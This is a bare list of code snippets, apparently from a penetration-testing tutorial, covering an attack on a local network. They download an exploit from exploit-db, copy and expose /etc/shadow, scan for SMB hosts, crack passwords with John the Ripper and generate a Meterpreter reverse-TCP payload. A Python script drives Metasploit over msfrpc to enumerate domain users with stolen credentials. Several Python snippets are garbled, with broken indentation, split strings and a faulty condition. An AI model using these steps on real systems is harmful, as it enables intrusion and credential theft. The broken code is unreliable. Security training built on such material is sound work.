["```py\nwget http://www.exploit-db.com/download/8572 -O escalate.c\n\n```", "```py\n#!/bin/bash\ncp /etc/shadow /tmp/shadow\nchmod 777 /tmp/shadow\nmd5sum /tmp/shadow > /tmp/hashes\nmd5sum /etc/shadow >> /tmp/hashes\n\n```", "```py\nnmap -sS -vvv -p445 192.168.195.0/24 -oG output\n\n```", "```py\ngrep 445/open output| cut -d\" \" -f2 >> smb_hosts\n\n```", "```py\njohn --show unshadowed |cut -d: -f2|grep -v \" \" > passwords\n\n```", "```py\nuse cs/meterpreter/rev_tcp\nset LPORT 443\nset LHOST 192.168.195.160\nset use_arya Y\ngenerate\n\n```", "```py\nnet group \"Domain Admins\"\n\n```", "```py\ngrep <username> <spoofile.log>\n\n```", "```py\nimport os, argparse, sys, time\ntry:\n    import msfrpc\nexcept:\n    sys.exit(\"[!] Install the msfrpc library that can be found \n      here: https://github.com/SpiderLabs/msfrpc.git\")\ntry:\n    import nmap\nexcept:\n    sys.exit(\"[!] Install the nmap library: pip install python-nmap\")\ntry:\n    import netifaces\nexcept:\n    sys.exit(\"[!] Install the netifaces \n      library: pip install netifaces\")\n```", "```py\ndef target_identifier(verbose, dir, user, passwd, ips, port_num, ifaces, ipfile):\n    hostlist = []\n    pre_pend = \"smb\"\n    service_name = \"microsoft-ds\"\n    service_name2 = \"netbios-ssn\"\n    protocol = \"tcp\"\n    port_state = \"open\"\n    bufsize = 0\n    hosts_output = \"%s/%s_hosts\" % (dir, pre_pend)\n```", "```py\n    if ipfile != None:\n  if verbose > 0:\nprint(\"[*] Scanning for hosts from file %s\") % (ipfile)\n        with open(ipfile) as f:\n            hostlist = f.read().replace('\\n',' ')\n        scanner.scan(hosts=hostlist, ports=port_num)\n    else:\n  if verbose > 0:\n        print(\"[*] Scanning for host\\(s\\) %s\") % (ips)\n        scanner.scan(ips, port_num)\n    open(hosts_output, 'w').close()\n    hostlist=[]\n    if scanner.all_hosts():\n        e = open(hosts_output, 'a', bufsize)\n    else:\n        sys.exit(\"[!] No viable targets were found!\") \n```", "```py\n    for host in scanner.all_hosts():\n        for k,v in ifaces.iteritems():\n            if v['addr'] == host:\n                print(\"[-] Removing %s from target list since it \n                    belongs to your interface!\") % (host)\n                host = None \n```", "```py\n        if host != None:\n            e = open(hosts_output, 'a', bufsize)\n            if service_name or service_name2 in \n              scanner[host][protocol][int(port_num)]['name']:\n                if port_state in \n                    scanner[host][protocol][int(port_num)]['state']:\n                    if verbose > 0:\n                        print(\"[+] Adding host %s to %s since the service \n                            is active on %s\") % (host, hosts_output, port_num)\n                    hostdata=host + \"\\n\"\n                    e.write(hostdata)\n                    hostlist.append(host)\n    else:\n        if verbose > 0:\n               print(\"[-] Host %s is not being added to %s since the \n                   service is not active on %s\") % \n                       (host, hosts_output, port_num)\n    if not scanner.all_hosts():\n        e.closed\n    if hosts_output:\n        return hosts_output, hostlist \n```", "```py\ndef build_command(verbose, user, passwd, dom, port, ip):\n    module = \"auxiliary/scanner/smb/smb_enumusers_domain\"\n    command = '''use ''' + module + '''\nset RHOSTS ''' + ip + '''\nset SMBUser ''' + user + '''\nset SMBPass ''' + passwd + '''\nset SMBDomain ''' + dom +'''\nrun\n'''\n    return command, module\n```", "```py\ndef run_commands(verbose, iplist, user, passwd, dom, port, file):\n    bufsize = 0\n    e = open(file, 'a', bufsize)\n    done = False\n```", "```py\n    client = msfrpc.Msfrpc({})\n    client.login('msf','msfrpcpassword')\n    try:\n        result = client.call('console.create')\n    except:\n        sys.exit(\"[!] Creation of console failed!\")\n    console_id = result['id']\n    console_id_int = int(console_id)\n```", "```py\n    for ip in iplist:\n        if verbose > 0:\n            print(\"[*] Building custom command for: %s\") % (str(ip))\n        command, module = build_command(verbose, user, \n          passwd, dom, port, ip)\n        if verbose > 0:\n            print(\"[*] Executing Metasploit module %s \n              on host: %s\") % (module, str(ip)) \n```", "```py\n        client.call('console.write',[console_id, command])\n        time.sleep(1)\n        while done != True:\n```", "```py\n            result = client.call('console.read',[console_id_int])\n            if len(result['data']) > 1:\n                if result['busy'] == True:\n                    time.sleep(1)\n                    continue\n                else:\n                    console_output = result['data']\n                    e.write(console_output)\n                    if verbose > 0:\n                        print(console_output)\n                    done = True\n```", "```py\n    e.closed\n    client.call('console.destroy',[console_id])\n```", "```py\nload msgrpc Pass=msfrpcpassword\n```"]